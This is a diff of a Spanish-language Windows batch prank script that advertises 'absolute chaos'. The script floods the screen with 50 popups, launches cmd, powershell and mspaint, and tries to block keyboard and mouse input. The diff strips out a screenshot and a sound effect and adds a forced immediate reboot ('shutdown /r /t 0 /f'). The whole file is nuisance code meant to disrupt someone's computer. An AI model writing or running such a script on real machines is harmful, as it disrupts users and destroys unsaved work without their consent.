@@ -1,5 +1,5 @@
 @echo off
-echo INICIANDO CAOS ABSOLUTO NIVEL DIOS AJJAJAJAJAJ
+echo INICIANDO CAOS ABSOLUTO CON REINICIO FINAL AJJAJAJAJAJ
 
 :: Bloquear teclado y ratón temporalmente
 echo Bloqueando controles...
@@ -25,10 +25,6 @@ for /L %%i in (1,1,30) do (
     timeout /t 1 /nobreak >nul
 )
 
-:: Rotar pantalla (voltea la pantalla)
-echo ROTANDO PANTALLA...
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AltTabSettings" /t REG_DWORD /d 2 /f
-
 :: 50 VENTANAS EMERGENTES AUTOMÁTICAS
 echo BOMBARDEO DE 50 VENTANAS...
 for /L %%i in (1,1,50) do (
@@ -45,41 +41,24 @@ start mspaint
 start cmd
 start powershell
 
-:: Desbloquear controles después de 10 segundos
-timeout /t 10 /nobreak >nul
+:: Desbloquear controles después de 8 segundos
+timeout /t 8 /nobreak >nul
 rundll32.exe user32.dll,BlockInput
 
-:: Cambiar resolución de pantalla (temporal)
-echo ALTERANDO RESOLUCIÓN...
-powershell -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds"
-
-:: Invertir colores de pantalla
-echo INVIRTIENDO COLORES...
-powershell -c "Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen; $bounds = $screen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save('%temp%\screenshot.png')"
-
-:: Mensaje final EPICO
-echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\epic.vbs
-echo oWS.Popup "¡CAOS ABSOLUTO LOGRADO! 😈🔥", 4, "VICTORIA DEL DIABLO", 64 >> %temp%\epic.vbs
-start wscript %temp%\epic.vbs
-
-:: Sonido de risa malvada (si tiene archivo de sonido)
-echo Agregando risa malvada...
-echo Set Sound = CreateObject("WMPlayer.OCX.7") > %temp%\sound.vbs
-echo Sound.URL = "https://www.soundjay.com/human/devil-laugh-1.wav" >> %temp%\sound.vbs
-echo Sound.Controls.play >> %temp%\sound.vbs
-echo while Sound.currentmedia.duration = 0 >> %temp%\sound.vbs
-echo wscript.sleep 100 >> %temp%\sound.vbs
-echo wend >> %temp%\sound.vbs
-echo wscript.sleep (int(Sound.currentmedia.duration)+1)*1000 >> %temp%\sound.vbs
-start wscript %temp%\sound.vbs
+:: Mensaje final de REINICIO
+echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\reinicio.vbs
+echo oWS.Popup "¡CAOS COMPLETADO! REINICIANDO EN 5 SEGUNDOS... 😈", 5, "REINICIO INMINENTE", 48 >> %temp%\reinicio.vbs
+start wscript %temp%\reinicio.vbs
 
 echo.
-echo ¡CAOS ABSOLUTO IMPLANTADO! 🔥
-echo El infierno se ha desatado en tu PC...
-pause >nul
+echo ¡ULTIMO AVISO! REINICIANDO EN 5 SEGUNDOS...
+echo ESTE ES EL FINAL... 🔥
+timeout /t 5 /nobreak >nul
 
-:: Limpiar caos
+:: REINICIAR LA PC
+echo REINICIANDO SISTEMA...
+shutdown /r /t 0 /f
+
+:: Limpiar (aunque ya se reiniciará)
 del %temp%\caos*.vbs
-del %temp%\epic.vbs
-del %temp%\sound.vbs
-del %temp%\screenshot.png
+del %temp%\reinicio.vbs
